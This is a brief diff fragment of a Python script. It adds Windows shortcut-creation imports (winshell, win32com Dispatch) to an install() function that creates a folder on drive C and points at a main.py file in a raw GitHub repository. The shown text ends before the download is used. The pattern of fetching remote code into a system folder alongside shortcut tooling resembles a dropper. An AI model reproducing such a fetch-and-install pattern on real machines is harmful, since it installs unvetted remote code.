@@ -1,5 +1,7 @@
 import os
 import requests
+import winshell
+from win32com.client import Dispatch
 def install():
 	os.mkdir("c:/julinjutut")
 	url = 'https://raw.githubusercontent.com/Juliasmatius/fjjfgjhfg/main/main.py'
